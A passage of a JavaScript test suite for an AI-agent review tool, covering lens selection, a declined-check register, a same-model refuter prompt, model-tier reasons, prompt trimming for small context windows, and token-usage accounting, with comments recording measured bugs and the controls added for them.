    // Two dry rounds retires a lens — the register's whole purpose.
    const run = { rounds: [{ lens: LENSES[0].id, confirmed: 0 }, { lens: LENSES[0].id, confirmed: 0 }] };
    chk("  two dry rounds retire a lens", pickLens(run).id !== LENSES[0].id);
    const allDry = { rounds: LENSES.flatMap((l) => [{ lens: l.id, confirmed: 0 }, { lens: l.id, confirmed: 0 }]) };
    chk("  and when every lens is retired it still returns one rather than crashing", !!pickLens(allDry));
  }
}
console.log("# investigate — the lens register is the COMPANY's, and it learns across runs");
{
  // The bug this fixes, measured before it was fixed: pickLens read only run.rounds, so two runs with no history both
  // picked LENSES[0], and a lens that went dry twice was forgotten when the run ended. With the dry-exit at 2 rounds
  // that meant most runs only ever reached lenses 1-2 and five of the eight never ran at all.
  {
    const orgA = {}, orgB = {};
    seedLenses(orgA); seedLenses(orgB);
    eq("  seeding produces one entry per built-in lens", orgA.lenses.length, LENSES.length);
    eq("  each starts with no yield recorded", [orgA.lenses[0].found, orgA.lenses[0].dry, orgA.lenses[0].off], [0, 0, false]);
    bookLensRound(orgA, LENSES[0].id, 0, 1000);
    bookLensRound(orgA, LENSES[1].id, 0, 2000);
    const a = pickLens({ rounds: [] }, orgA.lenses, orgA.lenses).id;
    chk("  a company that has already spent two lenses starts run 2 somewhere else", a !== LENSES[0].id && a !== LENSES[1].id);
    // The control: a company that has NOT tried anything still starts at the top, so the line above is about the
    // recorded history and not about the ordering being scrambled.
    eq("  while a company with no history still starts at the first lens", pickLens({ rounds: [] }, orgB.lenses, orgB.lenses).id, LENSES[0].id);
  }
  {
    const org = {}; seedLenses(org);
    for (const l of org.lenses) { l.found = 0; l.dry = 1; l.lastAt = 1000; }
    const proven = org.lenses[5]; proven.found = 4;
    eq("  once everything has been tried, the one that finds things wins", pickLens({ rounds: [] }, org.lenses, org.lenses).id, proven.id);
    proven.off = true;
    chk("  a lens switched off is not offered at all", !activeLenses(org).some((l) => l.id === proven.id));
    eq("  and the picker never returns it", pickLens({ rounds: [] }, activeLenses(org), org.lenses).id !== proven.id, true);
  }
  {
    const org = {}; seedLenses(org);
    bookLensRound(org, LENSES[0].id, 3, 500);
    eq("  a find books the COUNT, not just a tally of rounds", org.lenses[0].found, 3);
    bookLensRound(org, LENSES[0].id, 0, 600);
    eq("  and a dry round is recorded too, because that is what improves the next ordering", [org.lenses[0].found, org.lenses[0].dry], [3, 1]);
    eq("  an unknown lens books nothing", bookLensRound(org, "no-such-lens", 1, 700), null);
  }
  {
    // Upgrades: a later release adds a lens. That must not wipe what this company learned about the others, and must
    // not overwrite a prompt the operator rewrote.
    const org = {}; seedLenses(org);
    org.lenses[0].found = 9;
    org.lenses[1].prompt = "my own instruction, at least forty characters long so it is a real one"; org.lenses[1].edited = true;
    org.lenses.push({ id: "mine", prompt: "an operator's own lens, phrased as an instruction to do something", found: 2, dry: 0, off: false, edited: true });
    seedLenses(org, [...LENSES, { id: "brand-new", prompt: "a lens added by a later release" }]);
    eq("  the new lens is added", org.lenses.filter((l) => l.id === "brand-new").length, 1);
    eq("  existing yield survives", org.lenses.find((l) => l.id === LENSES[0].id).found, 9);
    chk("  an edited prompt is left alone", org.lenses.find((l) => l.id === LENSES[1].id).prompt.startsWith("my own instruction"));
    chk("  an UNedited prompt tracks the code, so a release can improve the wording", org.lenses.find((l) => l.id === LENSES[2].id).prompt === LENSES[2].prompt);
    eq("  and the operator's own lens is kept", org.lenses.filter((l) => l.id === "mine").length, 1);
  }
  {
    eq("  with no register at all it falls back to the built-ins", activeLenses({}).length, LENSES.length);
    eq("  and a malformed entry is ignored rather than crashing the round", activeLenses({ lenses: [{ id: "", prompt: "" }, { id: "x", prompt: "y" }] }).length, 1);
    const src = readFileSync(new URL("../server.mjs", import.meta.url), "utf8");
    chk("  investigate is given the register rather than the constant", src.includes("pickLens(run, lenses, lensStats)"));
    chk("  and every round is booked against the company, dry ones included", src.includes("bookLensRound(o, round.lens, round.confirmed"));
  }
}
console.log("# the gate runs npm without a shell and without a .cmd");
{
  // execFile refuses to spawn a .cmd on Windows and throws SYNCHRONOUSLY, so `npm test` — one of four shapes the
  // check allowlist permits — could never run here, and the promise wrapper never settled either.
  const cli = 'C:/x/node_modules/npm/bin/npm-cli.js';
  const found = npmArgv(['test'], 'C:/x/node.exe', cli, () => true);
  eq('  npm runs as a script under this node binary', [found.bin, found.argv], ['C:/x/node.exe', [cli, 'test']]);
  eq('  and a script name is passed through', npmArgv(['run', 'lint'], 'C:/x/node.exe', cli, () => true).argv, [cli, 'run', 'lint']);
  // The control: an unfamiliar install must degrade to the plain binary rather than pointing at a missing file.
  const missing = npmArgv(['test'], 'C:/x/node.exe', cli, () => false);
  chk('  an unfamiliar layout falls back to the plain binary', missing.bin !== 'C:/x/node.exe' && missing.argv.join(' ') === 'test');
  {
    const src = readFileSync(new URL('../server.mjs', import.meta.url), 'utf8');
    chk('  io.sh uses it rather than spawning npm directly', src.includes('c === "npm" ? npmArgv(a)'));
    chk('  and run1 survives a synchronous spawn failure', src.includes('could not start '));
    chk('  a path in "command" is not treated as a search term', src.includes('&& !resolveRepoTarget(all.files || [], term)'));
    chk('  either field may carry the path', src.includes('Either field may hold the path'));
    chk('  and a finish wrapped in propose_action is treated as a finish', src.includes('next.type = "finish";'));
  }
}
console.log("# the refuter: the two questions no mechanical control can answer");
{
  // Chosen scope, and the reason for it. verifyFinding proves a check DISCRIMINATES — failed, passed with the fix,
  // failed again on revert. It does not prove the check tests the property the claim names. That is the proxy
  // problem and it is measured: 5 of 7 derived audits on the 4water build asserted a proxy, every one green, on real
  // input, computing correctly, answering a weaker question. And when the declined-check falsifier returns zero hits
  // that means nothing was NAMED, not that the reason is sound.
  const s = refuteMsgs('sufficiency', { claim: 'the POST accepts a wrong CSRF token', where: 'src/http.mjs:210', check: 'node --test test/csrf.test.mjs' });
  const sys = s[0].content, usr = s[1].content;
  chk('  it tells the reviewer the three observations are NOT up for dispute', /observed, not claimed/.test(sys));
  chk('  and asks the one question they cannot answer', /satisfy this check while the claimed defect is STILL PRESENT/.test(sys));
  chk('  it gives the proxy failure a concrete shape', /wrong LENGTH/.test(sys));
  chk('  invites an empty answer, so padding is not rewarded', /nothing obvious/.test(sys));
  chk('  and carries the claim and the check', usr.includes('wrong CSRF token') && usr.includes('node --test test/csrf.test.mjs'));

  const e = refuteMsgs('excuse', { what: 'whether a larger window fits', because: 'the GPU has no room', unblockedBy: 'measuring free VRAM' });
  chk('  the excuse prompt says a silent search is weak evidence', /nothing the reason NAMED appears in the code/.test(e[0].content));
  chk('  asks measured-or-inferred', /MEASURED or INFERRED/.test(e[0].content));
  chk('  and asks for a weaker version of the check', /weaker version/.test(e[0].content));
  chk('  carrying all three recorded fields', e[1].content.includes('larger window') && e[1].content.includes('no room') && e[1].content.includes('free VRAM'));
  // Controls: the two jobs must be genuinely different prompts, and neither may ask this model for JSON.
  chk('  the two jobs are different prompts', sys !== e[0].content);
  chk('  and neither asks for JSON, which this model is worst at', !/JSON/i.test(sys.replace(/no JSON/gi, '')) && !/JSON/i.test(e[0].content.replace(/no JSON/gi, '')));
  {
    const src = readFileSync(new URL('../server.mjs', import.meta.url), 'utf8');
    chk('  a same-model review is labelled weak where it is stored', src.includes('same-model review, so weak evidence'));
    // The defect I wrote and then removed: catch { return "" } made a broken reviewer read as a clean one.
    chk('  and a reviewer that could not be reached does NOT read as a clean review', src.includes('this is NOT a clean review'));
    chk('  it runs after a finding is confirmed', src.includes('refute("sufficiency", rec'));
    chk('  and on an excuse the grep did not contradict', src.includes('refute("excuse", shape.declined'));
    chk('  with a switch, because it spends a turn per confirmed finding', src.includes('o.guardrails.refute ='));
    chk('  and it cannot overturn anything — the finding is recorded before the reviewer is asked',
        src.indexOf('(run.findings || (run.findings = [])).push(rec)') < src.indexOf('refute("sufficiency", rec'));
  }
}
console.log("# an excuse is a claim: the declined-check register");
{
  // Bureau already refuses an unproven FINDING and an unstated ASSUMPTION. This is the third thing: an unexamined
  // EXEMPTION — a reason for not checking something, which is the least likely claim to get a control because its
  // whole job is to close the question. It comes from a real failure: two panels and a dozen renderers shipped
  // unlooked-at here on the grounds that "the authed UI needs the operator token", while the project's own test
  // harness had always minted a disposable one. One grep would have shown it.
  const good = { what: 'the Lenses panel renders', because: 'the authed UI needs the operator token', unblocked_by: 'a disposable token on a throwaway server' };
  const no = (label, body, needle) => { const r = normalizeDeclinedCheck({ ...good, ...body }); chk('  ' + label, r.ok === false && (!needle || r.reason.includes(needle))); };
  no('nothing named', { what: '' }, 'WHAT');
  no('no reason given', { because: '' }, 'indistinguishable');
  // The field that makes the exemption testable at all.
  no('no statement of what would unblock it', { unblocked_by: '' }, 'never gets examined');
  chk('  a complete declaration is accepted', normalizeDeclinedCheck(good).ok === true);
  chk('  and it reads the action field names too', normalizeDeclinedCheck({ title: 'x', command: 'y', details: 'z' }).ok === true);

  // Its counterpart: the check that RAN and showed nothing. Same gate, same reason — a note that does not say
  // where it looked is a shrug, and a shrug and a round that never looked leave identical marks on the record.
  chk('  a note needs a heading', normalizeNote({ details: 'looked everywhere' }).ok === false);
  chk('  and what was actually looked at', normalizeNote({ heading: 'Auth paths' }).ok === false);
  chk('  saying so in the reason', normalizeNote({ heading: 'Auth paths' }).reason.includes('never looked'));
  chk('  a complete note is accepted', normalizeNote({ heading: 'Auth paths', found: 'checked all six, all gated' }).ok === true);
  chk('  and it reads the action field names too', normalizeNote({ title: 'x', details: 'y' }).ok === true);
  chk('  falling back to command when details is empty', normalizeNote({ title: 'x', command: 'y' }).ok === true);

  // The falsifier. An excuse says "the operator token", not OPERATOR_TOKEN, so noun phrases become identifier
  // spellings — that translation is the whole trick.
  const c = blockerCandidates(good.because);
  chk('  it derives the snake_case spelling', c.includes('operator_token'));
  chk('  the SCREAMING_SNAKE one', c.includes('OPERATOR_TOKEN'));
  chk('  and the camelCase one', c.includes('operatorToken'));
  chk('  it takes an explicit identifier as given', blockerCandidates('needs BUREAU_PORT set').includes('BUREAU_PORT'));
  chk('  and a flag', blockerCandidates('only with --serve').includes('--serve'));
  // The control that kept this gate usable: bare English words are NOT candidates. Measured — "operator",
  // "provider" and "replace" each hit any codebase, so a genuinely blocking excuse looked contradicted three
  // times over, and a gate that fires on everything gets routed around.
  chk('  bare words are not candidates', !blockerCandidates('the operator must replace the provider').includes('operator'));
  eq('  nothing in, nothing out', blockerCandidates('').length, 0);

  {
    // falsifyBlocker takes the search function, so the decision is testable without a repository.
    const fake = async (repo, term) => term === 'OPERATOR_TOKEN'
      ? { ok: true, hits: [{ file: 'test/run-all.mjs', line: 53, text: 'process.env.OPERATOR_TOKEN = "test_" + randomBytes(18)' }] }
      : { ok: true, hits: [] };
    const hits = await falsifyBlocker('any', good.because, fake);
    eq('  the excuse that started this is contradicted, with a location', [hits.length, hits[0].at], [1, 'test/run-all.mjs:53']);
    const clean = await falsifyBlocker('any', 'the GPU has no room for a larger window', fake);
    eq('  while an excuse naming nothing in the repo stands', clean.length, 0);
  }
  {
    const org = {};
    const a = recordDeclinedCheck(org, { what: 'the Lenses panel renders', because: 'b', unblockedBy: 'c' }, 1000);
    eq('  it is recorded on the COMPANY, not left in a summary', [a.added, org.declinedChecks.length], [true, 1]);
    const b = recordDeclinedCheck(org, { what: 'the lenses panel renders', because: 'b', unblockedBy: 'c' }, 2000);
    eq('  the same skip twice is one entry with a count', [b.added, b.declined.seen, org.declinedChecks.length], [false, 2, 1]);
    const c2 = recordDeclinedCheck(org, { what: 'the questions panel renders', because: 'b', unblockedBy: 'c' }, 3000);
    eq('  and a different skip is its own entry', [c2.added, org.declinedChecks.length], [true, 2]);
  }
  {
    const src = readFileSync(new URL('../server.mjs', import.meta.url), 'utf8');
    chk('  the dispatch falsifies before recording', src.includes('falsifyBlocker(repo, shape.declined.because'));
    chk('  hands the evidence back ONCE, rather than blocking forever', src.includes('run._declinedShown') && src.includes('shown.add(key)'));
    chk('  and a review round is offered the action', src.includes('"ask_peer", "declined_check"'));
  }
}
console.log("# nothing inside runAgentTask is used before it is declared (temporal dead zone)");
{
  // A crash I shipped, found by a live run and not by 884 tests. The tier emit was placed 49 lines ABOVE the four
  // consts it reads, so every agent turn threw "Cannot access 'paidTier' before initialization" — hunts died between
  // the lens event and the first model call. The test that supposedly covered it asserted
  // src.includes('emit(run, \"tier\"'): the line's TEXT was present, which was never in question. And every
  // server-suite test is model-free, so not one of them runs an agent turn.
  const src = readFileSync(new URL('../server.mjs', import.meta.url), 'utf8');
  const start = src.indexOf('async function runAgentTask');
  const body = src.slice(start, src.indexOf(String.fromCharCode(10) + 'async function ', start + 10));
  chk('  runAgentTask was located', start > 0 && body.length > 5000);
  // Whole-line comments are stripped first: the prose above the paid-model block MENTIONS budgetUsd, and a
  // substring search counted that as a use, reporting a defect that was not there. Only full-line comments are
  // removed, so no line that also carries code can be damaged.
  const code = body.split(String.fromCharCode(10)).filter((l) => !l.trim().startsWith('//')).join(String.fromCharCode(10));
  for (const name of ['paidTier', 'budgetUsd', 'startPaidSpent', 'canUsePaid']) {
    // indexOf, not a regex: this file has had escapes eaten by a quoting layer five times, and a regex that
    // silently matches nothing returns -1 and reports a defect that is not there — which is what it did here.
    const decl = Math.max(code.indexOf('const ' + name), code.indexOf('let ' + name));
    const use = code.indexOf(name);
    chk('  ' + name + ' is declared before its first use', decl >= 0 && use >= decl);
  }
  // The control: the same test, run against a rigged body, must FAIL — otherwise the four lines above are decoration.
  {
    const rigged = 'async function x(){ emit(paidTier.model); const paidTier = 1; }';
    const rd = rigged.indexOf('const paidTier'), ru = rigged.indexOf('paidTier');
    chk('  and it catches a rigged use-before-declare', !(rd >= 0 && ru >= rd));
  }
}
console.log("# which model tier serves a turn, and why it is not the other one");
{
  // Working out why every hunt in this project ran on the local model took reading four conditions across three
  // files. From the outside an unfunded agent is indistinguishable from a missing API key, and the agents used in
  // those runs had budgetUsd 0 — which no output ever mentioned. A new key alone would not have changed anything.
  eq('  a funded agent on a configured provider goes paid', tierReason({ paidAvailable: true, budgetUsd: 3 }).tier, 'paid');
  eq('  and needs no explanation', tierReason({ paidAvailable: true, budgetUsd: 3 }).reason, '');
  // The four ways it stays local must be DISTINGUISHABLE, which is the entire point.
  const why = (o) => tierReason(o).reason;
  chk('  no provider says so', /no paid provider/.test(why({ paidAvailable: false, budgetUsd: 3 })));
  chk('  an unfunded agent says so, and does not read as a missing key', /no budget/.test(why({ paidAvailable: true, budgetUsd: 0 })));
  chk('  a hush run says so', /hush/.test(why({ paidAvailable: true, hush: true, budgetUsd: 3 })));
  chk('  an exhausted budget says so', /already spent/.test(why({ paidAvailable: true, budgetUsd: 3, paidSpent: 3 })));
  chk('  and all four reasons differ', new Set([
    why({ paidAvailable: false, budgetUsd: 3 }), why({ paidAvailable: true, budgetUsd: 0 }),
    why({ paidAvailable: true, hush: true, budgetUsd: 3 }), why({ paidAvailable: true, budgetUsd: 3, paidSpent: 3 }),
  ]).size === 4);
  for (const o of [{ paidAvailable: false }, { paidAvailable: true, budgetUsd: 0 }, { hush: true }])
    eq('  every failing case is local', tierReason(o).tier, 'local');
  // The window caveat belongs where the two facts matter together, and nowhere else.
  chk('  a local REVIEW round is told about the 4096-token window', /4096/.test(why({ paidAvailable: false, phase: 'investigate' })));
  chk('  a local construction turn is not', !/4096/.test(why({ paidAvailable: false, phase: 'work' })));
  chk('  and a paid review round is not', !/4096/.test(tierReason({ paidAvailable: true, budgetUsd: 3, phase: 'investigate' }).reason));
  eq('  called with nothing at all it still answers', tierReason().tier, 'local');
  chk('  and the turn loop announces it before any model call',
      readFileSync(new URL('../server.mjs', import.meta.url), 'utf8').includes('emit(run, "tier"'));
}
console.log("# a hunting turn must FIT the context window that exists");
{
  // Measured, and it is the root cause of every model-side failure in this work: Ollama's default context window is
  // 4,096 tokens (probed — a 50kB prompt reports 2,050 prompt tokens instead of ~9,865 and the model answers from the
  // filler rather than the rule at the top). Bureau sets num_ctx nowhere and Latch reaches Ollama through the
  // OpenAI-compatible endpoint, which has no such field. A hunting turn starts near the limit and a read pushes it
  // over, so the prompt is clipped from the FRONT — losing the system message with the JSON action format.
  // Raising the window is a machine change on a GPU with 2.2GB free, so it is the operator's. Trimming the prompt is
  // free, and a review round can only use a handful of actions anyway.
  const org = { guardrails: { findingRepo: 'C:/x' } }, agent = { name: 'Ada', role: 'Software reviewer' };
  const normal = systemPrompt(org, agent);
  const hunt = systemPrompt(org, agent, { phase: 'investigate' });
  chk('  a hunting prompt is smaller than a construction one', hunt.length < normal.length - 1000);
  for (const k of ['read_repo', 'register_finding', 'ask_stakeholder', 'note'])
    chk('  it keeps ' + k + ', which a review round needs', hunt.includes('- ' + k + ':'));
  for (const k of ['file_write', 'purchase', 'github_pr', 'github_file'])
    chk('  it drops ' + k + ', which a review round must not do', !hunt.includes('- ' + k + ':'));
  chk('  and it says so in words as well as by omission', /REVIEW phase/.test(hunt));
  // The controls: construction must be untouched, or this trades one phase's reliability for another's capability.
  for (const k of ['file_write', 'purchase', 'github_pr', 'read_repo', 'note'])
    chk('  construction still advertises ' + k, normal.includes('- ' + k + ':'));
  chk('  and the turn loop passes the phase through', readFileSync(new URL('../server.mjs', import.meta.url), 'utf8').includes('systemPrompt(org, agent, { phase: run.phase })'));
}
console.log("# a turn that proposes nothing must not pass in silence");
{
  // Observed nine times in a row after a 20kB read: speak "…", actionType "other", every field empty. Two causes,
  // both silence: "other" was ADVERTISED in the action enum and has no dispatch branch, and nothing noticed an
  // action carrying no content. A wasted turn the model cannot detect is a turn it will repeat until the cap.
  const src = readFileSync(new URL('../server.mjs', import.meta.url), 'utf8');
  chk('  an action with nothing in it is refused with a reason', src.includes('That proposed nothing'));
  chk('  and "other" is refused too, since nothing implements it', src.includes('is not a real action here'));
  chk('  three in a row ends the round instead of burning the turn budget', src.includes('emptyActions >= 3'));
  chk('  a real proposal resets the counter', src.includes('emptyActions = 0;   // a real proposal resets it'));
  chk('  the round records that it gave up, rather than reading as a clean dry round', src.includes('gaveUp: true'));
  // The root cause, and the control on it: the prompt must not offer an action nothing implements.
  chk('  "other" is no longer advertised in the actionType enum', !src.includes('|"note"|"other"'));
  // What stood here read: chk('while note — which IS implemented — still is', src.includes('|"email_draft"|"note"')).
  // It was false for as long as it was green. `note` was enumerated, documented to the agent as the right answer for
  // an empty-handed review round, and listed in three action sets — with no dispatch branch anywhere. The assertion
  // confirmed the ENUM's spelling and then said something about the DISPATCHER that nothing had checked, which is
  // how a green suite came to certify the opposite of the truth. A probe that reads the source and asserts on its
  // text passes whatever the code does; it is the shape the finding gate refuses when an agent submits one.
  //
  // The property moved to test/action-surface.test.mjs, where both sides are derived from source and the reachable
  // one is canonicalised by CALLING normalizeAction rather than by reading it. What belongs here is the narrow fact
  // this block is about: "other" has no executor on purpose, and that is now written down instead of assumed.
  chk('  and "other" has no executor BY REGISTRATION, not by oversight', "other" in UNEXECUTED_ACTIONS);
}
console.log("# a round starts from the codebase's own names, not from conventions it may not use");
{
  // Isolated by a planted-defect run. The sibling-path round opened with requireAuth|requireAdmin|assertAdmin|
  // guard|checkRole — the conventional names — and this codebase calls its guard gate()/postGate(). It missed the
  // route table entirely, spent the round elsewhere, and never opened the file where the planted authorization
  // defect sat. A codebase whose guard is named unconventionally looks, to a guessing agent, like one with no guard.
  const R = mkdtempSync(join(tmpdir(), 'repo-vocab-'));
  try {
    const { mkdirSync, writeFileSync: wf } = await import('node:fs');
    mkdirSync(join(R, 'src')); mkdirSync(join(R, 'test'));
    const LF = String.fromCharCode(10);
    wf(join(R, 'src', 'server.mjs'), ['export function buildApp() {}', 'const gate = (c) => c;', 'const postGate = (c) => c;'].join(LF) + LF);
    wf(join(R, 'src', 'config.mjs'), ['export const REQUIRED_ROLES = [1];'].join(LF) + LF);
    wf(join(R, 'test', 'a.test.mjs'), ['export const shouldNotAppear = 1;'].join(LF) + LF);
    const v = await repoVocabulary(R);
    const txt = vocabularyText(v);
    chk('  it names the guard this repo actually uses', txt.includes('gate'));
    chk('  and its sibling', txt.includes('postGate'));
    chk('  and a constant that governs the rules', txt.includes('REQUIRED_ROLES'));
    chk('  grouped by the file that defines them', txt.includes('src/server.mjs:'));
    // The controls. Test files are excluded — their helpers are not the product's vocabulary — and nothing invents
    // a name the repo does not contain, which is the failure this replaces.
    chk('  test files are left out', !txt.includes('shouldNotAppear'));
    chk('  and it does not invent conventional names', !txt.includes('requireAuth') && !txt.includes('checkRole'));
    chk('  an empty repo yields no text rather than a header', vocabularyText({ ok: true, entries: [] }) === '');
    chk('  and a failed scan yields nothing', vocabularyText({ ok: false }) === '');
  } finally { rmSync(R, { recursive: true, force: true }); }
  {
    const src = readFileSync(new URL('../server.mjs', import.meta.url), 'utf8');
    // The DIGEST superseded the vocabulary block in the round prompt: the same names, plus line numbers, file sizes
    // and route registrations. repoVocabulary/vocabularyText stay exported and tested above — still the right shape
    // for a names-only summary — but sending both would pay twice for the same information every turn.
    chk('  the round prompt carries the digest', src.includes('taxonomy = {}, digest = '));
    // The property is that the repository is WALKED once per run — that is the expensive half, reading every file.
    // RENDERING moved into the round loop when the map gained coverage-first ordering, because what a round has
    // already opened changes between rounds and a map rendered once cannot show it. These two assertions named the
    // rendering call verbatim, so they failed on that change while the property they describe stayed true. They now
    // assert the walk, with a control that it does not happen per round; the ordering itself is covered for real below.
    chk('  runGated walks the repository once per run', /const dg0 = await repoDigest\(/.test(src));
    chk('  and so does hunt mode', /const dg = await repoDigest\(/.test(src));
    chk('  and the walk is not repeated inside the round loop', (src.match(/await repoDigest\(/g) || []).length === 2);
    chk('  and the round no longer sends the vocabulary block as well',
        !src.includes('vocabulary: vocabularyText('));
    // The read cap was a mitigation for a 4,096-token LOCAL window; on a paid turn it cost ten searches
    // reconstructing a 4,785-byte file.
    {
      // This scraped the source for `const readCap = canUsePaid() ? ` and parsed the two numbers out of the
      // ternary — a workaround for the decision being inline and therefore uncallable. It is a function now, so
      // the property can be asserted by asking it rather than by reading the file it lives in. Scope-dependent
      // behaviour is covered in scope.test.mjs; what belongs here is the tier property this block always meant.
      chk('  a paid turn gets more room than a local one', repoReadCap(true, []) > repoReadCap(false, []));
      chk('  and the local cap still fits a 4,096-token window', repoReadCap(false, []) <= 4000);
    }
  }
}
console.log("# investigate — the BODY of a read is capped, the OUTLINE never is");
{
  // Both false claims this session were absence claims made from a 4,000-character prefix of a 20,279-byte file:
  // "the 'invite' provider is not handled" and "hasRole is not defined here". Both are wrong and both were
  // answerable from a complete list of what the file declares. I first answered this with a WARNING and the model
  // ignored it twice, which is the correct lesson about warnings — so the outline is structural instead.
  const LF = String.fromCharCode(10);
  const src = [
    'export const PROVIDERS = [1, 2, 3];',
    'function helper() { return 1; }',
  ].concat(new Array(400).fill('// filler line, nothing declared here'))
   .concat([
    'export const hasRole = (db, id, role) => {',
    'export function redeemInvite(db, token) {',
    'class Roster {',
    'const build = function () { return 2; };',
   ]).join(LF);

  const o = repoOutline(src);
  eq('  it counts the whole file, not the part you can see', o.lines, 406);
  const has = (n) => o.symbols.some((s) => s.text.includes(n));
  for (const n of ['PROVIDERS', 'helper', 'hasRole', 'redeemInvite', 'Roster', 'build'])
    chk('  it lists ' + n + ', including past any prefix cap', has(n));
  chk('  with a line number that points at the declaration', o.symbols.find((s) => s.text.includes('hasRole')).line > 400);
  // The controls. Without them an outline that returned every line would pass all six lines above.
  chk('  a symbol that is not declared is absent from it', !has('notARealSymbol'));
  chk('  and filler lines are not mistaken for declarations', !o.symbols.some((s) => s.text.includes('filler')));
  eq('  an empty file outlines to nothing', repoOutline('').symbols.length, 0);
  eq('  and so does null', repoOutline(null).symbols.length, 0);
  {
    const many = repoOutline(new Array(300).fill('export const x = () => 1;').join(LF), 20);
    eq('  the outline is capped and says so', [many.symbols.length, many.truncated], [20, true]);
  }
  {
    // A minified bundle is one enormous line; outlining it would dump the whole file back.
    const wide = repoOutline('export const a = 1;' + ' '.repeat(500) + '// pad');
    eq('  an absurdly long line is skipped rather than quoted', wide.symbols.length, 0);
  }
  {
    const s2 = readFileSync(new URL('../server.mjs', import.meta.url), 'utf8');
    chk('  a truncated read carries the outline', s2.includes('Every declaration in the WHOLE'));
    chk('  built from the WHOLE file, not from the capped body', s2.includes('readRepoFile(repo, target, 400000)'));
    chk('  and it states the asymmetry both ways', s2.includes('it really is not declared here') && s2.includes('it exists even though you cannot see its body'));
  }
}
console.log("# the token SPLIT is recorded, and an unreported field is not zero");
{
  // Only total_tokens was kept, which was fine while PAID_TIERS charged one flat rate for input and output. It
  // stops being fine against a provider that prices them differently -- Kimi K2.6 is $0.95/M in against $4.00/M
  // out, DeepSeek V4-Flash $0.14 against $0.28 -- because a total cannot be turned into money without the mix.
  //
  // This is the exact shape Moonshot returns, copied from a live call rather than imagined.
  const REAL = { prompt_tokens: 14, completion_tokens: 16, total_tokens: 30, cached_tokens: 14,
                 completion_tokens_details: { reasoning_tokens: 15 },
                 prompt_tokens_details: { cached_tokens: 14 } };
  const s1 = usageSplit(REAL);
  eq('  input, output and total come straight through', [s1.input, s1.output, s1.total], [14, 16, 30]);
  eq('  cached comes from the NESTED field, which is the one actually sent', s1.cached, 14);
  eq('  reasoning tokens are billed as output and are invisible in the reply text', s1.reasoning, 15);
  chk('  and it is not marked estimated', s1.estimated === false);

  // UNKNOWN IS NOT ZERO. A provider that reports nothing must not read as a run that used no input.
  const s2 = usageSplit(null, 4321);
  eq('  with no usage at all the total falls back to the estimate', s2.total, 4321);
  eq('  and every unreported field is null, not 0', [s2.input, s2.output, s2.cached, s2.reasoning], [null, null, null, null]);
  chk('  and the call is flagged as estimated', s2.estimated === true);
  // A provider that reports the total but no breakdown: the total is real, the split is still unknown.
  const s3 = usageSplit({ total_tokens: 100 });
  eq('  a total without a breakdown keeps the total and admits the rest', [s3.total, s3.input, s3.output], [100, null, null]);

  // Accumulating must COUNT what it examined, or a partial sum reads as a whole-run measurement.
  let acc = null;
  acc = addUsage(acc, usageSplit(REAL));
  acc = addUsage(acc, usageSplit(null, 1000));           // this call reported nothing
  acc = addUsage(acc, usageSplit({ total_tokens: 50, prompt_tokens: 40 }));
  eq('  totals add up across calls', [acc.calls, acc.total], [3, 1080]);
  eq('  input sums only the calls that reported it, and says how many', [acc.input, acc.inputCalls], [54, 2]);
  eq('  output likewise', [acc.output, acc.outputCalls], [16, 1]);
  chk('  and the estimated calls are counted separately', acc.estimatedCalls === 1);
  // The control: without the per-field counts, 54 input tokens over 3 calls would read as the whole run's input.
  chk('  the counts make a partial measurement legible rather than confident',
      acc.inputCalls < acc.calls && acc.outputCalls < acc.calls);
}
console.log("# every call of a turn is charged, not only the one that survived");
{
  // Measured. `meta.usage` is overwritten per call and the turn booked once, so the eleven first calls that
  // returned nothing but reasoning were free. The round reported $0.003336; the uncounted calls had really cost
  // $0.004372, making the true spend 2.3x the figure canUsePaid() was enforcing the budget against.
  const failed = { total_tokens: 1000, completion_tokens: 1000, completion_tokens_details: { reasoning_tokens: 1000 } };
  const kept   = { total_tokens: 500, prompt_tokens: 100, completion_tokens: 400 };
  const both = usagesForTurn({ usages: [failed, kept] }, 99);
  eq('  a turn that retried books BOTH calls', both.map((s) => s.total), [1000, 500]);
  // The control. Without it this passes just as well when only the survivor is booked.
  eq('  CONTROL: booking only the last would have charged 500, not 1,500',
     both.reduce((n, s) => n + s.total, 0), 1500);
  chk('  and the failed call is not silently free', both[0].total > 0);

  // The estimate describes the text the turn ended up using, so it belongs to the LAST call. Handing it to an
  // earlier call would invent tokens for a call that reported none.
  const est = usagesForTurn({ usages: [null, null] }, 42);
  eq('  the fallback estimate lands on the last call only', est.map((s) => s.total), [0, 42]);

  // Backwards compatibility: anything that still sets only meta.usage keeps working.
  eq('  a single legacy meta.usage still books', usagesForTurn({ usage: { total_tokens: 7 } }, 0).map((s) => s.total), [7]);
  eq('  and no usage at all falls back to the estimate', usagesForTurn({}, 42).map((s) => s.total), [42]);

  const src2 = readFileSync(new URL("../server.mjs", import.meta.url), "utf8");
  chk('  askLlm records every call, not just the last', /opts\.meta\.usages \|\| \(opts\.meta\.usages = \[\]\)/.test(src2));
  chk('  and the booking site loops over them', /for \(const split of usagesForTurn\(meta, callTokens\)\)/.test(src2));
}
console.log("# an unparseable reply says WHY, and stops being invisible");
{
  const src3 = readFileSync(new URL("../server.mjs", import.meta.url), "utf8");
  // The measured round said "I've been unable to format the probe JSON correctly", tried an action it was not
  // allowed, and finished having registered nothing. Bureau emitted no event for any of it, so from outside it
  // looked exactly like a round that found nothing.
  eq('  a reply cut off mid-object is diagnosed as truncated',
     jsonFailure('{"speak":"x","next":{"details":"a long expl').reason, "truncated");
  eq('  a real line break inside a string is named as such',
     jsonFailure('{"speak":"one\ntwo","next":{}}').reason, "raw-newline");
  eq('  prose with no object at all', jsonFailure("I could not format that.").reason, "prose");
  eq('  an empty reply', jsonFailure("").reason, "empty");
  eq('  and anything else falls through to the parser message',
     jsonFailure('{"speak":"hi","next":{"a":1,},}').reason, "syntax");

  // The controls. A diagnosis that fires on VALID json, or a parser that broke while being refactored, would both
  // pass a suite that only checked the failure cases.
  chk('  CONTROL: valid JSON still parses after the refactor',
      safeParse('{"speak":"ok","next":{"actionType":"note"}}')?.next?.actionType === "note");
  chk('  CONTROL: junk after the object is still tolerated',
      safeParse('{"speak":"ok","next":{}} trailing junk }')?.speak === "ok");
  chk('  CONTROL: a fenced reply still parses', safeParse('```json\n{"speak":"ok","next":{}}\n```')?.speak === "ok");

  const g = jsonFailure('{"speak":"x","next":{"details":"cut', 1).guidance;
  chk('  the guidance names the actual problem', /CUT OFF/.test(g));
  chk('  shows a concrete valid shape', /"actionType":"register_finding"/.test(g));
  chk('  and forbids the raw line break that causes most of these', /NO raw line breaks/.test(g));
